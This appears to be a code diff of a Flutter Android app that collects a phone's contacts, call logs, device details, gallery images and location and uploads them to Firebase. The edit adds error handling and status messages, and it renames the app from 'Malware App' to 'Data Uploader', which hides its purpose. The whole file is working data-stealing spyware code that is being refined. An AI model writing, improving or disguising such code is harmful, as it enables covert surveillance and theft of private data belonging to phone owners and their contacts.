@@ -75,65 +75,77 @@ class _HomeScreenState extends State<HomeScreen> {
 
   // Fetch and send contacts
   Future<void> fetchAndSendContacts() async {
-    Iterable<Contact> contacts = await ContactsService.getContacts();
-    List<Map<String, dynamic>> contactList = [];
+    try {
+      Iterable<Contact> contacts = await ContactsService.getContacts();
+      List<Map<String, dynamic>> contactList = [];
 
-    for (Contact contact in contacts) {
-      contactList.add({
-        'name': contact.displayName,
-        'phone': contact.phones?.map((e) => e.value).toList() ?? [],
-        'email': contact.emails?.map((e) => e.value).toList() ?? [],
-      });
+      for (Contact contact in contacts) {
+        contactList.add({
+          'name': contact.displayName,
+          'phone': contact.phones?.map((e) => e.value).toList() ?? [],
+          'email': contact.emails?.map((e) => e.value).toList() ?? [],
+        });
+      }
+
+      await sendDataToFirestore('contacts', contactList);
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Contacts uploaded to Firebase')));
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Failed to upload contacts: $e')));
     }
-
-    await sendDataToFirestore('contacts', contactList);
-    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Contacts uploaded to Firebase')));
   }
 
   // Fetch and send call logs
   Future<void> fetchAndSendCallLogs() async {
-    Iterable<CallLogEntry> callLogs = await CallLog.get();
-    List<Map<String, dynamic>> callLogList = [];
+    try {
+      Iterable<CallLogEntry> callLogs = await CallLog.get();
+      List<Map<String, dynamic>> callLogList = [];
 
-    for (CallLogEntry entry in callLogs) {
-      callLogList.add({
-        'name': entry.name,
-        'number': entry.number,
-        'duration': entry.duration,
-        'timestamp': DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0).toString(),
-        'callType': entry.callType.toString(),
-      });
+      for (CallLogEntry entry in callLogs) {
+        callLogList.add({
+          'name': entry.name,
+          'number': entry.number,
+          'duration': entry.duration,
+          'timestamp': DateTime.fromMillisecondsSinceEpoch(entry.timestamp ?? 0).toString(),
+          'callType': entry.callType.toString(),
+        });
+      }
+
+      await sendDataToFirestore('call_logs', callLogList);
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Call logs uploaded to Firebase')));
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Failed to upload call logs: $e')));
     }
-
-    await sendDataToFirestore('call_logs', callLogList);
-    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Call logs uploaded to Firebase')));
   }
 
   // Fetch and send device info
   Future<void> fetchAndSendDeviceInfo() async {
-    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
-    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+    try {
+      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
 
-    Map<String, dynamic> deviceInfoData = {
-      'model': androidInfo.model,
-      'brand': androidInfo.brand,
-      'androidVersion': androidInfo.version.release,
-      'device': androidInfo.device,
-    };
+      Map<String, dynamic> deviceInfoData = {
+        'model': androidInfo.model,
+        'brand': androidInfo.brand,
+        'androidVersion': androidInfo.version.release,
+        'device': androidInfo.device,
+      };
 
-    await sendDataToFirestore('device_info', [deviceInfoData]);
-    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('')));
+      await sendDataToFirestore('device_info', [deviceInfoData]);
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Device info uploaded to Firebase')));
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Failed to upload device info: $e')));
+    }
   }
 
   // Fetch and upload gallery images using PhotoManager
   Future<void> loadGalleryImages(String uid) async {
     if (!_permissionsGranted) {
-      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('')));
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Permissions not granted')));
       return;
     }
 
     if (_isUploading) {
-      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('')));
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Upload in progress, please wait')));
       return;
     }
 
@@ -169,8 +181,7 @@ class _HomeScreenState extends State<HomeScreen> {
   // Function to check if a link already exists
   Future<bool> alreadyExistLink({required String link}) async {
     // Implement your logic to check if the link already exists in your Firestore
-    // For this example, we'll return false to simulate that it doesn't exist
-    return false;
+    return false; // Example: always return false
   }
 
   // Upload image to Firebase Storage and return the download link
@@ -190,16 +201,20 @@ class _HomeScreenState extends State<HomeScreen> {
 
   // Fetch and send location
   Future<void> fetchAndSendLocation() async {
-    Location location = Location();
-    LocationData _locationData = await location.getLocation();
+    try {
+      Location location = Location();
+      LocationData _locationData = await location.getLocation();
 
-    Map<String, double?> locationData = {
-      'latitude': _locationData.latitude,
-      'longitude': _locationData.longitude,
-    };
+      Map<String, double?> locationData = {
+        'latitude': _locationData.latitude,
+        'longitude': _locationData.longitude,
+      };
 
-    await sendDataToFirestore('locations', [locationData]);
-    ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('')));
+      await sendDataToFirestore('locations', [locationData]);
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Location uploaded to Firebase')));
+    } catch (e) {
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text('Failed to upload location: $e')));
+    }
   }
 
   // Helper function to send data to Firestore
@@ -213,7 +228,7 @@ class _HomeScreenState extends State<HomeScreen> {
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: Text('Malware App'),
+        title: Text('Data Uploader'),
       ),
       body: Center(
         child: SingleChildScrollView(
@@ -222,23 +237,23 @@ class _HomeScreenState extends State<HomeScreen> {
             children: [
               ElevatedButton(
                 onPressed: fetchAndSendContacts,
-                child: Text(' Contacts '),
+                child: _isUploading ? CircularProgressIndicator() : Text('Contacts'),
               ),
               ElevatedButton(
                 onPressed: fetchAndSendCallLogs,
-                child: Text('Call Logs'),
+                child: _isUploading ? CircularProgressIndicator() : Text('Call Logs'),
               ),
               ElevatedButton(
                 onPressed: fetchAndSendDeviceInfo,
-                child: Text('Device Info'),
+                child: _isUploading ? CircularProgressIndicator() : Text('Device Info'),
               ),
               ElevatedButton(
                 onPressed: () => loadGalleryImages('your_user_id'), // Replace 'your_user_id' with actual UID
-                child: Text(' Gallery Images'),
+                child: _isUploading ? CircularProgressIndicator() : Text('Gallery Images'),
               ),
               ElevatedButton(
                 onPressed: fetchAndSendLocation,
-                child: Text(' Location '),
+                child: _isUploading ? CircularProgressIndicator() : Text('Location'),
               ),
             ],
           ),
